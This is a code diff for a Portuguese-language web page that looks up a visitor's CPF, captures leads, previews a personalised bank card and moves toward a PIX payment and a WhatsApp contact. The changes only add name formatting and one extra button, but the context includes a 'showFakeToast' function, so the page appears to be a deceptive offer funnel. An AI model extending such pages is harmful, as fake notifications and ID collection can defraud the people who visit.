@@ -294,8 +294,12 @@ async function consultarCpf() {
       $id('cpf-result').classList.remove('hidden');
 
       const firstName = data.nome.split(' ')[0];
-      if ($id('welcome-name-display')) $id('welcome-name-display').textContent = firstName;
-      if ($id('style-card-name')) $id('style-card-name').textContent = firstName;
+      if (typeof updateCardNameDisplays === 'function') {
+        updateCardNameDisplays(data.nome);
+      } else {
+        if ($id('welcome-name-display')) $id('welcome-name-display').textContent = firstName;
+        if ($id('style-card-name')) $id('style-card-name').textContent = firstName;
+      }
 
       fetch('/api/lead', {
         method: 'POST',
@@ -617,8 +621,12 @@ function submitCardStyle() {
     cv.style.background = CARD_TEMPLATES[STATE.color || 'classico'].bg; 
     if(csvg) csvg.innerHTML = CARD_TEMPLATES[STATE.color || 'classico'].svg;
   }
-  var cn = document.getElementById('summary-card-name');
-  if(cn) cn.innerText = leadName;
+  if (typeof updateCardNameDisplays === 'function') {
+    updateCardNameDisplays(leadName);
+  } else {
+    var cn = document.getElementById('summary-card-name');
+    if(cn) cn.innerText = leadName;
+  }
 }
 
 // Seleção de método de envio — carrega gerente e vai ao WhatsApp
@@ -831,6 +839,7 @@ function showDone() {
   const waUrl = `https://wa.me/${waNumber}?text=${msg}`;
   if ($id('btn-contact-manager')) $id('btn-contact-manager').href = waUrl;
   if ($id('btn-contact-manager-2')) $id('btn-contact-manager-2').href = waUrl;
+  if ($id('btn-contact-manager-3')) $id('btn-contact-manager-3').href = waUrl;
   
   // Render Custom Card info in Success Screen
   const cv = $id('success-card-visual');
@@ -880,6 +889,78 @@ function showFakeToast(title, desc) {
   }, 4000);
 }
 
+// Formatador inteligente de nome do titular no cartão (padrão emissão bancária de luxo)
+function formatCardHolderName(name) {
+    if (!name || typeof name !== 'string') return 'SEU NOME';
+    let clean = name.trim().toUpperCase().replace(/\s+/g, ' ');
+    if (!clean || clean === 'CLIENTE' || clean === 'VISITANTE' || clean === 'LEAD') return 'SEU NOME';
+    
+    // Se o nome cabe perfeitamente (até 19 caracteres), mantém completo
+    if (clean.length <= 19) return clean;
+    
+    const parts = clean.split(' ');
+    if (parts.length <= 2) {
+        return clean;
+    }
+    
+    const firstName = parts[0];
+    const lastName = parts[parts.length - 1];
+    const middleNames = parts.slice(1, -1);
+    
+    // Tenta abreviar os nomes do meio com inicial: ex: "JULIA FEITOSA CORTINES LAXE" -> "JULIA F. C. LAXE"
+    const middleAbbr = middleNames.map(m => m[0] + '.').join(' ');
+    const candidate = `${firstName} ${middleAbbr} ${lastName}`;
+    if (candidate.length <= 22) {
+        return candidate;
+    }
+    
+    // Se ainda ficar longo, mantém apenas a primeira inicial do meio
+    const candidate2 = `${firstName} ${middleNames[0][0]}. ${lastName}`;
+    if (candidate2.length <= 22) {
+        return candidate2;
+    }
+    
+    // Fallback elegante: Primeiro e Último nome
+    return `${firstName} ${lastName}`;
+}
+
+function updateCardNameDisplays(rawName) {
+    if (!rawName) return;
+    const cardFormattedName = formatCardHolderName(rawName);
+    const fullName = rawName.trim().toUpperCase();
+    
+    // Elementos do cartão físico recebem nome inteligente, estilizado e sem quebra
+    const cardElements = [
+        'style-card-name', 'welcome-name-display', 
+        'analysis-name-display', 'summary-card-name', 'success-card-name', 'card-preview-name'
+    ];
+    
+    cardElements.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) {
+            el.innerText = cardFormattedName;
+            el.title = fullName;
+            // Calibração dinâmica inteligente do tamanho da fonte para encaixe milimétrico
+            if (cardFormattedName.length > 20) {
+                el.style.fontSize = '0.58rem';
+            } else if (cardFormattedName.length > 16) {
+                el.style.fontSize = '0.64rem';
+            } else if (cardFormattedName.length > 13) {
+                el.style.fontSize = '0.70rem';
+            } else {
+                el.style.fontSize = '0.76rem';
+            }
+        }
+    });
+    
+    // Elementos de texto de resumo recebem o nome completo
+    const textElements = ['sum-nome', 'pix-nome'];
+    textElements.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.innerText = fullName;
+    });
+}
+
 // Modificação PIX Timer e API
 const _oldGoTo = window.goToStep;
 if(_oldGoTo) {
@@ -892,15 +973,7 @@ if(_oldGoTo) {
         
         if(STATE.nome_completo || STATE.nomeLead || STATE.nome) {
             const nom = STATE.nome_completo || STATE.nomeLead || STATE.nome;
-            const elements = [
-                'sum-nome', 'pix-nome', 'analysis-name-display', 
-                'welcome-name-display', 'style-card-name', 
-                'summary-card-name', 'success-card-name'
-            ];
-            elements.forEach(id => {
-                const el = document.getElementById(id);
-                if(el) el.innerText = nom.toUpperCase();
-            });
+            updateCardNameDisplays(nom);
         }
         
         if(stepId === 'shipping-summary' || stepId === 'pix') {
